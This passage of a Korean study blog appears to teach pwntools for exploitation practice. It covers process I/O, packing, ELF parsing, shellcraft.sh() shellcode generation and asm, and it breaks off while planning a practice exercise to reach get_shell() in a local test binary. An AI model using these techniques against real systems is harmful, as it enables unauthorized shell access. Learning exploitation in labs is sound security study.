  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;./test&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# ./test에 &apos;A&apos;를 입력
&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# &apos;A&apos;+&apos;\n&apos;
&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;hello&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# ./test가 &apos;hello&apos;를 출력하면 &apos;A&apos;를 입력. Data로는 무조건 패킹된(스트링) 데이터가 들어가야 한다.
&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;hello&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# ./test가 &apos;hello&apos;를 출력하면 &apos;A&apos;+&apos;\n&apos;을 입력
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;3-recv&quot;&gt;3. recv&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;프로세스에서 데이터를 받기 위해 사용한다.&lt;/li&gt;
  &lt;li&gt;여러 variation이 있고, 각자 상황에 맞게 사용할 수 있다. (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwnlib.tubes.process&lt;/code&gt; 의 하위에 정의된 메소드이다)
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;recv()&lt;/code&gt; 와 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;recvn()&lt;/code&gt; 의 차이점을 주의해야 한다!
        &lt;ul&gt;
          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;recv(m)&lt;/code&gt; : 최대 m 바이트를 받는 것이기 때문에, 그만큼을 받지 못해도 에러를 발생시키지 않는다.&lt;/li&gt;
          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;recvn(m)&lt;/code&gt; : 정확히 m 바이트의 데이터를 받는 것이기 때문에 조건을 만족시키는 데이터를 받지 못하면 계속해서 기다린다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;사용예:&lt;/p&gt;

    &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;./test&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    
  &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# p가 출력하는 데이터를 최대 1024 바이트까지 받을 수 있다.
&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# store data printed out from p until &apos;\n&apos; comes in
&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# get exactly 5 bytes of data
&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;hello&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# store data printed out from p until &apos;hello&apos; comes in
&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# store data printed out from p until p is terminated 
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;4-packing--unpacking&quot;&gt;4. packing &amp;amp; unpacking&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;원래 기능은 hex ↔ string&lt;/li&gt;
  &lt;li&gt;부가적 기능으로 엔디언을 바꾸는 데 사용한다.&lt;/li&gt;
  &lt;li&gt;패킹(hex → string)을 위한 함수: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p32()&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p64()&lt;/code&gt;
    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;사용예: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p32(int, endian=&apos;big/little&apos;)&lt;/code&gt;&lt;/p&gt;

        &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
        
  &lt;span class=&quot;n&quot;&gt;s32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x41424344&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;# p64 사용법은 동일하므로 생략
&lt;/span&gt;        
  &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# 결과: b&apos;DCBA&apos;
&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;endian&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;big&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# 파라미터 추가 명시로 엔디언 변경 가능. 결과: b&apos;ABCD&apos;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;언패킹(string → hex)을 위한 함수: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;u32()&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;u64()&lt;/code&gt;
    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;사용예: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;u32((uint32_t*)addr, endian=’big/little’)&lt;/code&gt; , 리턴값은 int 형식.&lt;/p&gt;

        &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
        
  &lt;span class=&quot;n&quot;&gt;s32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ABCD&quot;&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;# s64 사용법은 동일하므로 생략
&lt;/span&gt;        
  &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# 결과: 0x44434241
&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;endian&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;big&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# 결과: 0x41424344
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;5-interactive&quot;&gt;5. interactive&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;셸을 획득했거나, 익스플로잇의 특정 상황에 직접 입력을 주면서 출력을 확인하고 싶을 때 사용하는 함수.
    &lt;ul&gt;
      &lt;li&gt;쌍방 세션을 생성해 준다.&lt;/li&gt;
      &lt;li&gt;실제로 호출하면 터미널이 뜨게 되고, 거기에서 입력 및 출력이 가능하다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;pwnlib.tubes.ssh.ssh.interactive이고, process나 remote를 사용하면서 그 하위 메소드로 이용할 수 있다.&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;사용예:&lt;/p&gt;

    &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;./test&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;6-elf&quot;&gt;6. ELF&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/system-hacking-step3-1/&quot;&gt;앞서 보았듯&lt;/a&gt;, ELF 파일의 헤더에는 각종 정보가 기록되어 있고, 이들은 높은 확률로 익스플로잇에 사용할 수 있다.&lt;/li&gt;
  &lt;li&gt;pwntools가 이런 정보들을 쉽게 참조할 수 있도록 보조해 준다.&lt;/li&gt;
  &lt;li&gt;[&lt;a href=&quot;http://docs.pwntools.com/en/latest/elf/elf.html?highlight=ELF&quot;&gt;자세한 메소드와 사용예&lt;/a&gt;]&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;사용예:&lt;/p&gt;

    &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;./test&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    
  &lt;span class=&quot;c1&quot;&gt;# 이하 ELF 메소드에 정의된 하위 메소드들 사용 가능
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;7-contextlog&quot;&gt;7. context.log&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;작성한 익스플로잇도 디버깅이 필요한데, 이때 사용하는 로깅 기능&lt;/li&gt;
  &lt;li&gt;로그 레벨은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;context.log_level&lt;/code&gt; 에 특정 값을 할당함으로써 조절 가능하다&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;사용예&lt;/p&gt;

    &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;imort&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;log_level&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;error&apos;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# 에러만 출력
&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;log_level&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;debug&apos;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# 대상 프로세스와 익스플로잇 간에 오가는 모든 데이터를 화면에 출력
&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;log_level&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;info&apos;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# 비교적 중요한 정보들만 추려서 출력
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;8-contextarch&quot;&gt;8. context.arch&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;architecture의 준말&lt;/li&gt;
  &lt;li&gt;즉, 공격 대상의 아키텍처 정보를 프로그래머가 원하는 대로 지정할 수 있게 함으로써 호환성을 높임&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;사용예&lt;/p&gt;

    &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;amd64&quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# x86-64
&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;i386&quot;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;arm&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;9-shellcraft&quot;&gt;9. shellcraft&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;셸코드를 작성해 익스플로잇을 수행하는 과정에서 상황에 따라 여러 제약 조건이 존재할 수 있다. 따라서, 이를 맞추기 위해 직접 셸코드를 작성해야 할 때가 있다.&lt;/li&gt;
  &lt;li&gt;pwntools에는 자주 사용되는 셸코드들이 저장되어 있어서 별다른 제약 조건이 없다면 꺼내 쓰면 된다.&lt;/li&gt;
  &lt;li&gt;amd64(x86-64) 타겟으로 생성할 수 있는 셸코드 목록: &lt;a href=&quot;https://docs.pwntools.com/en/stable/shellcraft/amd64.html&quot;&gt;여기&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;사용예:&lt;/p&gt;

    &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwm&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;amd64&apos;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# 아키텍처 지정을 하지 않으면 이후 shellcraft.amd64.{} 식으로 명시해 줘야 한다.
&lt;/span&gt;    
  &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcraft&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;10-asm&quot;&gt;10. asm&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;pwntools에서 제공하는 어셈블 기능&lt;/li&gt;
  &lt;li&gt;기계어로 어셈블하는 것이므로, 대상 아키텍처가 중요하다. 따라서, 아키텍처를 꼭 지정해 주고 시작한다.&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;사용예:&lt;/p&gt;

    &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;amd64&apos;&lt;/span&gt;
    
  &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcraft&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# 셸을 실행하는 셸 코드를 기계어로 어셈블
&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;결과:&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack3-2/Untitled.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;pwntools-실습&quot;&gt;pwntools 실습&lt;/h1&gt;

&lt;p&gt;아래의 코드에서 get_shell() 함수를 실행시키는 것이 목적이다. (시스템 해킹의 목적은 셸을 딴 후 루트 권한을 탈취하는 것이기 때문이다)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack3-2/Untitled%201.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;먼저 이전에 배웠던 내용을 다시 돌아볼 필요가 있다.&lt;/p&gt;

&lt;p&gt;어떤 함수의 스택 프레임이 생성될 때 직전까지 rip가 위치해 있던 함수의 스택 프레임과의 관계는 아래와 같다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack3-2/Untitled%202.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;또한 리눅스의 프로세스에게 할당되는 메모리 구조는 아래와 같다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack3-2/Untitled%203.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;이제 배운 내용을 기반으로 하여 주어진 문제를 어떻게 해결할지 계획을 세워 보자.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;단계&lt;/strong&gt;&lt;/p&gt;

  &lt;ol&gt;
    &lt;li&gt;get_shell 함수의 시작 주소를 알아낸다.&lt;/li&gt;
    &lt;li&gt;유저가 익스플로잇을 수행할 수 있는 부분을 좁힌다.
      &lt;ol&gt;
        &lt;li&gt;“Input: “이 출력됐을 때 값을 입력하는 부분이 유일하게 유저가 프로세스와 소통할 수 있는 부분이다.&lt;/li&gt;
        &lt;li&gt;따라서 유저 입력값을 받을 때 malicious 한 입력값을 넣어야 한다.&lt;/li&gt;
      &lt;/ol&gt;
    &lt;/li&gt;
    &lt;li&gt;현재 코드에서는 유저 입력값을 어디에 넣는지 확인한다.
      &lt;ol&gt;
